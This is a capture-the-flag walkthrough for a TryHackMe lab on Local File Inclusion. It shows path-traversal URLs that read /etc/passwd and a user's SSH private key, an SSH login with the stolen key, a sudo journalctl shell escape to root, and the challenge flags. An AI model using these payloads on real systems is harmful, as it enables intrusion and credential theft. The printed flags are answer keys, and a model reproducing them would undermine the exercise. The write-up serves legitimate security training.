# LFI

Understand and exploit a web server that is vulnerable to the Local File Inclusion (LFI) vulnerability.

[LFI](https://tryhackme.com/room/lfi)

## Topic's

- Local File Inclusion
- Directory Traversal
- Misconfigured Binaries (/bin/journalctl)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Deploy

Local File Inclusion (LFI) is the vulnerability that is mostly found in web servers. This vulnerability is exploited when a user input contains a certain path to the file which might be present on the server and will be included in the output. This kind of vulnerability can be used to read files containing sensitive and confidential data from the vulnerable system.

The main cause of this type of Vulnerability is improper sanitization of the user's input. Sanitization here means that whatever user input should be checked and it should be made sure that only the expected values are passed and nothing suspicious is given in input. It is a type of Vulnerability commonly found in PHP based websites but isn't restricted to them.

1. Deploy the VM and access its web server: http://MACHINE_IP

`No answer needed`

## Task 2 Getting user access via LFI

To test for LFI what we need is a parameter on any URL or any other input fields like request body etc. For example, if the website is tryhackme.com then a parameter in the URL can look like https://tryhackme.com/?file=robots.txt. Here file is the name of the parameter and robots.txt is the value that we are passing (include the file robots.txt).

Importance of Arbitrary file reading

A lot of the time LFI can lead to accessing (without the proper permissions) important and classified data. An attacker can use LFI to read files from your system which can give away sensitive information such as passwords/SSH keys; enumerated data can be further used to compromise the system.

In this task, we are going to find the parameter which is vulnerable to the Local File Inclusion attack. We will then will try to leverage information obtained to get access to the system.

1. Look around the website. What is the name of the parameter you found on the website?

`page`

2. Once we find the vulnerable parameter we can try to include the passwd file on the Linux system i.e /etc/passwd. The most common technique is path traversal method meaning we can include files like `../../../../etc/passwd` what this does it get out of a directory like we usually do in Linux system by running `cd ../`

`../../etc/passwd` means to go out twice from the current working directory and then go to `/etc` directory and read the `passwd` file. Now the issue with this method is you need to be sure about the path of the file.

You can read the [interesting files to check out](https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks) while testing for LFI.

[http://10.10.109.9/home?page=../../../../etc/passwd](http://10.10.109.9/home?page=../../../../etc/passwd)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```

`No answer needed`

3. Once you include `/etc/passwd` then you should see entries something like:

   root:x:0:0::/root:/bin/bash
   bin:x:1:1::/:/sbin/nologin
   daemon:x:2:2::/:/sbin/nologin

To understand all those entries read [this](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/) article.

This file can give information about the system like the name of all the existing users on the system.

`No answer needed`

4. What is the name of the user on the system?

`falcon`

5. Once you find the name of the user it's important to see if you can include anything **common** and **important** in that user's directory, could be anything like theirs **.bashrc** etc

`No answer needed`

6. Name of the file which can give you access to falcon's account on the system?

[10.10.109.9/home?page=../../home/falcon/.ssh/id_rsa](10.10.109.9/home?page=../../home/falcon/.ssh/id_rsa)

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAy5ab5+v0aBYFL7dN4O69CqvZdjpSk4/BFMOEndp71fy4qlBi
ewnTYIyKS1DjNhLdbLJZV/8oKOIx/BVSxrw3hnjL/b5d3jUpX1edcX8hjTt10LCT
ubgjWekIpspImHtp/vf9n0IlL1GIWLsxKZXEqyoSvvG4LU6ajrMyHM9jyZ7yMAsS
lHtfNzX22taxJliHF3SFDjf6Z0otY98T273qy6uTchBDEIZx7uJGQF4h9bvSq+22
e7QFY/h/cLrVUPGcRgv2VH4958A5n+BA48ioVyjGRcJlPsa8fNuFkgA8VlJqx/zD
Erf3G97zCY5iZSSm6g+9aUBAoqJqQqnZ1JY/jQIDAQABAoIBAQCjN3qEY7GM5OKB
j6Z7B0s9S+rKkxVywdQczmb6mpefRb3SpSFe3NC+3c1ddlrCFju4kf94wdIzfKxw
GbREKc8mGqAILN9abypdCoPp4u9GJ/5bMcUtJogI4/+QoCm1PXQL+ks1q7TeC7KQ
2HogibajNtbSiD2M7TCR6O3rFQU+NKW3P8R5rTJBFxSqXcoL0aZoOdIISuGo4e2D
w5p8eLHiYmKmQ3KYW58fau1Qnr8t0YoHDlG2wezNBQSckt5xxjY4XWlfcMPAQIP9
VWxv77zIqfLFYj6oH0opPHX7SbdpFVj00h7Ee2C0QR7CKj4lxmE2Dn97LEXksfWM
PqmJwiRBAoGBAPRGPZtAT7TfTac7lXbOYNj/5HuK1Pc7+GtsT8V3AJwbhkeZG/B+
ERee3gKlXhglEup0duxBwy5zTy6vsegMo7sk2ii/GlboR44Yy7OYbjrmIw7JRx6i
IIjN6YeKM+dwLGL7+xG2EavrRBJbuYfp1R139gK5CWd6Yu6xdwtCPS8xAoGBANVc
ZhSQOWzkN0Yq4CsAnKrrtIeynX7wTppy2F3N8/CQHQIYjFx0SZxs/1MlTXEpFdC+
VHhQ+Cy5O+hndqXiG5sty9wC67lZNaxuBkMoxKgX42JAgxxE41lUadAdRHJ4cq7A
1DiJ1xq3XwP1ZaUEVE/Y3EusMhtr/A6z1dGJcpcdAoGAdb6d14XqZb71iVS5OOlF
2ZOPKNXEzd+EYRN2aDJygszprv1ocEX0KzSSwye+8Vh9g7Hb2Qnh8TP3yQM7eCUP
jxe2aMmlAps4UpA1MD6bc5yW7Xur4mI32HmYxZKibj6txpC7dtASOJJQ36CDD7Zw
2aGHXcyfcdeWdIPqY+zr3SECgYEAoi4SCh93ByaSPWvp6cYVUHbKSzuiLBNOLGiP
vv4GJx3kbutqBfz+10Ci8/iu3Q11365NVwd1HcnPl+DNd1pf0Z0GEL7Hn6QIAIHB
kNs0YPGHje+ruZlDl2tq4x7cIIcd5Wf96Nwd/djVCJVIJh8cV3VoPr0teVqjxik8
poHr8KECgYBGJ/FLmaloEl00YECXAy2uMlvGyaAr2tsq28JF3LvZOXNIhB71+11V
E/gv9PP0ruJJRBv5r2DjAcsWA+sIBf5O8+z5dTeuto5v+WTrpOy8i3FLEWl3hqRH
ANCTI4EhCynYtF8zi8so5zeomlncFZg7JD/dL0gHXu4FImx5sUO9gg==
-----END RSA PRIVATE KEY-----
```

7. What is the user flag?

```
li@kali:~/CTFs/tryhackme/LFI$ chmod 600 id_rsa
kali@kali:~/CTFs/tryhackme/LFI$ ssh -i id_rsa falcon@10.10.109.9
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov  7 19:27:05 IST 2020

  System load:  0.0               Processes:           84
  Usage of /:   30.7% of 9.78GB   Users logged in:     0
  Memory usage: 15%               IP address for eth0: 10.10.109.9
  Swap usage:   0%


6 packages can be updated.
3 updates are security updates.


Last login: Wed Jan 29 20:13:44 2020 from 192.168.1.107
falcon@walk:~$ ls
user.txt
falcon@walk:~$ cat user.txt
B8LEGIF049JT4RTVWUG4
```

`B8LEGIF049JT4RTVWUG4`

## Task 3 Escalating your privileges to root

In this, we are going to focus on getting root-level access on the machine. This step is also known as Privilege escalation; we are going to escalate our privilege from a normal user to a root user (with the highest level of system privileges).

First, we'll have to find a vector that would be exploited to give us root access. A vector can be anything like a binary with some special permission or a cronjob that is not configured properly etc.

I've written a blog post about Linux privilege escalation, you can read it [here](https://mzfr.github.io/linux-priv-esc) to know more about it.

1. What can falcon run as **root**?

```
falcon@walk:~$ sudo -l
Matching Defaults entries for falcon on walk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falcon may run the following commands on walk:
    (root) NOPASSWD: /bin/journalctl
```

`/bin/journalctl`

2. Search gtfobins via the [website](http://gtfobins.github.io/) or by using [gtfo tool](http://github.com/mzfr/gtfo), to see if you find any way to use that binary for privilege escalation.

https://gtfobins.github.io/gtfobins/journalctl/

```
falcon@walk:~$ sudo journalctl
-- Logs begin at Tue 2020-01-28 19:00:21 IST, end at Sat 2020-11-07 19:29:51 IST. --
Jan 28 19:00:21 walk kernel: Linux version 4.15.0-20-generic (buildd@lgw01-amd64-039) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 (Ubuntu 4.15.0-20.21-gen
Jan 28 19:00:21 walk kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-20-generic root=UUID=979754d8-4db7-4b66-a804-28a498c1cc0f ro
Jan 28 19:00:21 walk kernel: KERNEL supported cpus:
Jan 28 19:00:21 walk kernel:   Intel GenuineIntel
Jan 28 19:00:21 walk kernel:   AMD AuthenticAMD
Jan 28 19:00:21 walk kernel:   Centaur CentaurHauls
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
Jan 28 19:00:21 walk kernel: x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
Jan 28 19:00:21 walk kernel: x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'standard' format.
Jan 28 19:00:21 walk kernel: e820: BIOS-provided physical RAM map:
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
!/bin/sh
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
H1EQRK5XEX140H2KMO08
```

`No answer needed`

3. What is the root flag?

`H1EQRK5XEX140H2KMO08`

4. Why not complete the [LFI beginner level challenge](https://tryhackme.com/room/inclusion) next?

`No answer needed`
